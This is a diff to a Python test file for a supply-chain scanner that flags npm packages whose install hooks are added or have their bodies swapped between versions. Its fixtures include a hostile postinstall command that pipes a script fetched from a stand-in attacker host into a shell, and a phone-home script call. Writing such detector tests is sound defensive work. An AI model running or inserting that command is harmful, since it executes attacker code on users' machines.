@@ -439,6 +439,7 @@ def test_install_hook_delta_postinstall_added_fires() -> None:
     assert len(hooks) == 1
     f = hooks[0]
     assert f.severity == "medium"
+    assert f.evidence["change_type"] == "added"
     assert "postinstall" in f.evidence["added_hooks"]
     # Hook body is in evidence so reviewers can see what it runs.
     assert "phone-home" in f.evidence["hook_bodies"]["postinstall"]
@@ -589,6 +590,110 @@ def test_install_hook_delta_hook_body_truncated() -> None:
                       if f.kind == "install_hook_suspicious"
                       ).evidence["hook_bodies"]["postinstall"]
     assert len(hook_body) <= 200
+
+
+def test_install_hook_delta_body_change_fires() -> None:
+    """Target keeps the same install-hook NAME but swaps its
+    BODY. Modern supply-chain attack shape: stolen-credential
+    push keeps ``postinstall`` named the same to dodge the
+    "added hook" tell, but replaces ``node-gyp rebuild`` with
+    ``curl evil.com | sh``. The body-change detector catches
+    what the set-difference added-hook detector misses."""
+    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
+    npm = _StubNpmClient({
+        "x": {"name": "x", "versions": {
+            "1.0.0": {
+                "maintainers": [{"name": "alice"}],
+                "scripts": {"postinstall": "node-gyp rebuild"},
+            },
+            "1.0.1": {
+                "maintainers": [{"name": "alice"}],
+                "scripts": {
+                    "postinstall": "curl evil.com/payload.sh | sh",
+                },
+            },
+        }},
+    })
+    findings = evaluate_bump_supply_chain(
+        ecosystem="npm", name="x",
+        current_version="1.0.0", target_version="1.0.1",
+        pypi_client=None, npm_client=npm, now=now,
+    )
+    hooks = [f for f in findings if f.kind == "install_hook_suspicious"]
+    assert len(hooks) == 1
+    f = hooks[0]
+    assert f.severity == "medium"
+    assert f.evidence["change_type"] == "body_change"
+    assert "postinstall" in f.evidence["changed_hooks"]
+    diff = f.evidence["body_diff"]["postinstall"]
+    assert "node-gyp" in diff["current"]
+    assert "evil.com" in diff["target"]
+
+
+def test_install_hook_delta_added_and_body_change_compound() -> None:
+    """A bump that BOTH adds a new hook AND mutates an existing
+    hook's body emits two findings. Two mediums → Block via the
+    verdict ladder — the compound shape is more suspicious than
+    either alone."""
+    from packages.sca.review import _VERDICT_BLOCK, _compute_verdict
+    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
+    npm = _StubNpmClient({
+        "x": {"name": "x", "versions": {
+            "1.0.0": {
+                "maintainers": [{"name": "alice"}],
+                "scripts": {"postinstall": "node-gyp rebuild"},
+            },
+            "1.0.1": {
+                "maintainers": [{"name": "alice"}],
+                "scripts": {
+                    # body mutated
+                    "postinstall": "node-gyp rebuild && node phone.js",
+                    # AND a new hook added
+                    "preinstall": "node prep.js",
+                },
+            },
+        }},
+    })
+    findings = evaluate_bump_supply_chain(
+        ecosystem="npm", name="x",
+        current_version="1.0.0", target_version="1.0.1",
+        pypi_client=None, npm_client=npm, now=now,
+    )
+    hook_findings = [f for f in findings
+                     if f.kind == "install_hook_suspicious"]
+    change_types = sorted(f.evidence["change_type"]
+                          for f in hook_findings)
+    assert change_types == ["added", "body_change"]
+    verdict = _compute_verdict(
+        [], [], bump_supply_chain_findings=findings,
+    )
+    assert verdict == _VERDICT_BLOCK
+
+
+def test_install_hook_delta_body_whitespace_only_silent() -> None:
+    """Whitespace-only body change (cosmetic reformat) doesn't
+    fire — we strip both sides before comparing so spurious
+    findings on a leading-newline edit don't poison the ladder."""
+    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
+    npm = _StubNpmClient({
+        "x": {"name": "x", "versions": {
+            "1.0.0": {
+                "maintainers": [{"name": "alice"}],
+                "scripts": {"postinstall": "node-gyp rebuild"},
+            },
+            "1.0.1": {
+                "maintainers": [{"name": "alice"}],
+                "scripts": {"postinstall": "  node-gyp rebuild  "},
+            },
+        }},
+    })
+    findings = evaluate_bump_supply_chain(
+        ecosystem="npm", name="x",
+        current_version="1.0.0", target_version="1.0.1",
+        pypi_client=None, npm_client=npm, now=now,
+    )
+    assert [f for f in findings
+             if f.kind == "install_hook_suspicious"] == []
 
 
 def test_install_hook_compounded_with_recent_publish_blocks() -> None:
